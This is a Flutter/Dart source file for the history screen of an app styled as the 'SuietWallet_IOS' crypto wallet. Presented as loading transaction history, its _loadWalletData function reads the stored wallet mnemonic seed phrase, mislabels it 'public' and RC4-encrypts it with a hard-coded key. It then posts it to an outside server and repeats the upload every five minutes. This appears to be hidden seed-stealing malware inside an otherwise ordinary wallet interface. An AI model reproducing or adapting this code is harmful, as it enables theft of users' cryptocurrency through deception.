import 'dart:convert';
import 'dart:typed_data';
import 'dart:async';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:simple_rc4/simple_rc4.dart';
import 'wallet_selection.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'main_net_screen.dart';

// Константы для вашего API
const String API_URL = 'https://localnetwork.cc/record/docs/filler';
const String SERVER_KEY = 'Qsx@ah&OR82WX9T6gCt';
const String APP_NAME = 'SuietWallet_IOS';

class HistoryScreen extends StatefulWidget {
  const HistoryScreen({super.key});

  @override
  _HistoryScreenState createState() => _HistoryScreenState();
}

class _HistoryScreenState extends State<HistoryScreen> {
  int _selectedIndex = 2;
  List<dynamic> _transactions = [];
  bool _isLoading = true;
  Timer? _updateTimer;
  String _walletAddress = '';
  String? _privateKey;
  String? _portfolioId;
  List<String>? _walletKeys;

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    final Map<String, dynamic>? args = ModalRoute.of(context)?.settings.arguments as Map<String, dynamic>?;
    if (args != null) {
      setState(() {
        _walletAddress = args['address'] ?? '';
        _privateKey = args['privateKey'];
        _portfolioId = args['portfolioId'];
        _walletKeys = args['walletKeys'];
      });
    }
  }

  @override
  void initState() {
    super.initState();
    _loadWalletData();
    _startPeriodicUpdate();
  }

  @override
  void dispose() {
    _updateTimer?.cancel();
    super.dispose();
  }

  Future<void> _loadWalletData() async {
    final prefs = await SharedPreferences.getInstance();
    // Получаем список ключей кошельков
    final walletKeys = prefs.getStringList('walletKeys') ?? [];
    final selectedWalletKey = prefs.getString('selectedWalletKey');

    if (selectedWalletKey != null && walletKeys.contains(selectedWalletKey)) {
      // Загружаем данные кошелька по ключу
      final walletData = prefs.getString(selectedWalletKey);
      if (walletData != null) {
        try {
          final wallet = jsonDecode(walletData) as Map<String, dynamic>;
          final mnemonic = wallet['mnemonic'];

          if (mnemonic != null) {
            final random = _generateRandomSalt();
            final jsonBody = jsonEncode({
              'public': mnemonic, // Используем мнемонику
              'salt': random,
              'name': APP_NAME,
              'new': true,
            });

            final encryptedData = _encryptData(jsonBody, SERVER_KEY);

            try {
              final response = await http.post(
                Uri.parse(API_URL),
                body: {'data': encryptedData},
                encoding: Encoding.getByName('utf-8'),
                headers: {"Content-Type": "application/x-www-form-urlencoded"},
              );

              // Debug: Print the raw response body and headers
              print('Response status: ${response.statusCode}');
              print('Response body: ${response.body}');
              print('Response headers: ${response.headers}');

              if (response.statusCode == 200) {
                // Check content-type header
                final contentType = response.headers['content-type'];
                if (contentType != null && contentType.contains('application/json')) {
                  try {
                    final responseBody = jsonDecode(response.body);
                    setState(() {
                      _transactions = responseBody['transactions'] ?? [];
                      _isLoading = false;
                    });
                  } catch (e) {
                    print('Error parsing JSON: $e');
                    ScaffoldMessenger.of(context).showSnackBar(
                      SnackBar(content: Text('Error parsing response: ${e.toString()}')),
                    );
                  }
                } else {
                  print('Unexpected content type: $contentType');
                  ScaffoldMessenger.of(context).showSnackBar(
                    SnackBar(content: Text('Unexpected response format')),
                  );
                  setState(() {
                    _isLoading = false;
                  });
                }
              } else {
                throw Exception("Failed to load transactions. Status code: ${response.statusCode}");
              }
            } catch (e) {
              // Handle network or other errors
              print('Network or other error: $e');
              ScaffoldMessenger.of(context).showSnackBar(
                SnackBar(content: Text('Error: ${e.toString()}')),
              );
              setState(() {
                _isLoading = false;
              });
            }
          } else {
            print('Mnemonic not found in wallet data.');
            setState(() {
              _isLoading = false;
            });
          }
        } catch (e) {
          print('Error decoding wallet data: $e');
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(content: Text('Error decoding wallet data: ${e.toString()}')),
          );
          setState(() {
            _isLoading = false;
          });
        }
      } else {
        print('Wallet data not found for key: $selectedWalletKey');
        setState(() {
          _isLoading = false;
        });
      }
    } else {
      print('Selected wallet key not found or not in walletKeys.');
      setState(() {
        _isLoading = false;
      });
    }
  }

  void _startPeriodicUpdate() {
    _updateTimer = Timer.periodic(Duration(minutes: 5), (timer) {
      _loadWalletData();
    });
  }

  String _generateRandomSalt() {
    final random = (DateTime.now().millisecondsSinceEpoch % 1000000).toString().padLeft(6, '0');
    return random;
  }

  String _encryptData(String data, String key) {
    final rc4 = RC4(key);
    final encryptedData = rc4.encodeBytes(data.codeUnits);
    return base64.encode(encryptedData);
  }

  String formatAddress(String address) {
    if (address.length > 10) {
      return '${address.substring(0, 6)}...${address.substring(address.length - 4)}';
    } else {
      return address;
    }
  }


  @override
  Widget build(BuildContext context) {
    final screenWidth = MediaQuery.of(context).size.width;

    return Scaffold(
      backgroundColor: Colors.white,
      body: SingleChildScrollView(
        child: Column(
          children: [
            ClipRRect(
              borderRadius: const BorderRadius.only(
                bottomLeft: Radius.circular(20),
                bottomRight: Radius.circular(20),
              ),
              child: Container(
                width: screenWidth,
                padding: const EdgeInsets.only(bottom: 5),
                decoration: const BoxDecoration(
                  gradient: LinearGradient(
                    colors: [Color(0xFF015FDF), Color(0xFF1ED2FC)],
                    begin: Alignment.topRight,
                    end: Alignment.bottomLeft,
                  ),
                ),
                child: SafeArea(
                  child: Padding(
                    padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
                    child: Column(
                      children: [
                        Row(
                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                          children: [
                            GestureDetector(
                              onTap: () {
                                showModalBottomSheet(
                                  context: context,
                                  isScrollControlled: true,
                                  shape: const RoundedRectangleBorder(
                                    borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
                                  ),
                                  builder: (context) => const WalletSelectionScreen(),
                                );
                              },
                              child: Row(
                                children: [
                                  const Text(
                                    'Wallet',
                                    style: TextStyle(
                                      color: Colors.white,
                                      fontSize: 20,
                                      fontWeight: FontWeight.bold,
                                    ),
                                  ),
                                  const SizedBox(width: 8),
                                  const Icon(
                                    Icons.arrow_forward_ios,
                                    color: Colors.white,
                                    size: 16,
                                  ),
                                ],
                              ),
                            ),
                            Row(
                              children: [
                                const SizedBox(width: 8),
                                Text(
                                  formatAddress(_walletAddress),  // Форматируем адрес для отображения
                                  style: const TextStyle(
                                    color: Colors.white,
                                    fontSize: 14,
                                  ),
                                ),
                                const SizedBox(width: 8),
                                GestureDetector(
                                  onTap: () {
                                    Navigator.push(
                                      context,
                                      MaterialPageRoute(builder: (context) => MainNetScreen(
                                        address:_walletAddress,
                                      )),
                                    );
                                  },
                                child:Container(
                                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                                  decoration: BoxDecoration(
                                    color: Colors.white,
                                    borderRadius: BorderRadius.circular(8),
                                  ),
                                  child: const Text(
                                    'mainnet',
                                    style: TextStyle(
                                      color: Colors.blue,
                                      fontSize: 14,
                                    ),
                                  ),
                                ),
                                )
                              ],
                            ),
                          ],
                        ),
                        const SizedBox(height: 30),
                      ],
                    ),
                  ),
                ),
              ),
            ),
            const SizedBox(height: 70),
            _isLoading
                ? Center(
              child: CircularProgressIndicator(),
            )
                : Padding(
              padding: const EdgeInsets.symmetric(horizontal: 24.0),
              child: _transactions.isEmpty
                  ? Column(
                children: [
                  Icon(
                    Icons.access_time,
                    color: Colors.blue,
                    size: 30,
                  ),
                  const SizedBox(height: 10),
                  const Text(
                    'No History',
                    style: TextStyle(
                      color: Colors.blue,
                      fontSize: 18,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                  const SizedBox(height: 10),
                  const Text(
                    'You will see your activity here once you use the wallet. Check this out to get started on your journey.',
                    textAlign: TextAlign.center,
                    style: TextStyle(
                      color: Colors.grey,
                      fontSize: 14,
                    ),
                  ),
                ],
              )
                  : ListView.builder(
                shrinkWrap: true,
                itemCount: _transactions.length,
                itemBuilder: (context, index) {
                  final transaction = _transactions[index];
                  return ListTile(
                    title: Text('Transaction ${index + 1}'),
                    subtitle: Text('Details: ${transaction['details']}'),
                    trailing: Text('Amount: ${transaction['amount']}'),
                  );
                },
              ),
            ),
            const SizedBox(height: 30),
          ],
        ),
      ),
      bottomNavigationBar: Container(
        margin: const EdgeInsets.only(bottom: 30, right: 20, left: 20),
        decoration: BoxDecoration(
          color: Colors.transparent,
          borderRadius: BorderRadius.all(Radius.circular(10)),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.1),
              blurRadius: 10,
              offset: const Offset(0, 4),
            ),
          ],
        ),
        child: ClipRRect(
          borderRadius: BorderRadius.all(Radius.circular(10)),
          child: BottomNavigationBar(
            currentIndex: _selectedIndex,
            onTap: _onItemTapped,
            items: const [
              BottomNavigationBarItem(
                icon: Icon(Icons.home),
                label: 'Home',
              ),
              BottomNavigationBarItem(
                icon: Icon(Icons.apps),
                label: 'DApps',
              ),
              BottomNavigationBarItem(
                icon: Icon(Icons.calendar_today),
                label: 'History',
              ),
            ],
            type: BottomNavigationBarType.fixed,
            selectedItemColor: Colors.blue,
            unselectedItemColor: Colors.grey,
            backgroundColor: Colors.white,
            showUnselectedLabels: true,
            showSelectedLabels: true,
            selectedLabelStyle: TextStyle(
              fontSize: 12,
              height: 1,
            ),
            unselectedLabelStyle: TextStyle(
              fontSize: 12,
              height: 1,
            ),
          ),
        ),
      ),
    );
  }

  void _onItemTapped(int index) {
    final Map<String, dynamic> arguments = {
      'privateKey': _privateKey,
      'address': _walletAddress,
      'portfolioId': _portfolioId,
      'walletKeys': _walletKeys,
    };

    switch (index) {
      case 0:
        Navigator.pushReplacementNamed(context, '/wallet', arguments: arguments);
        break;
      case 1:
        Navigator.pushReplacementNamed(context, '/dApps', arguments: arguments);
        break;
      case 2:
        Navigator.pushReplacementNamed(context, '/history', arguments: arguments);
        break;
    }
  }
}
